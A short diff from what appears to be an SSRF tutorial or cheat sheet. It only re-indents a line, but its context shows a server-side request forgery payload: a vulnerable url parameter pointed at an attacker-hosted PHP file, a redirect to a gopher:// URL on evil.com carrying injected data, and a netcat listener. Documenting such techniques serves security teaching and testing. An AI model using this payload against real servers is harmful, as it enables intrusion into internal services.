@@ -152,7 +152,7 @@ It is an application protocol used over an IP network to manage and access the d
    
     http://example.com/ssrf.php?url=http://attacker.com/gopher.phpgopher.php (host it on acttacker.com):-
     <?php
-   header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
+    header('Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest');
    ?>
 
   evil.com:# nc -lvp 1337
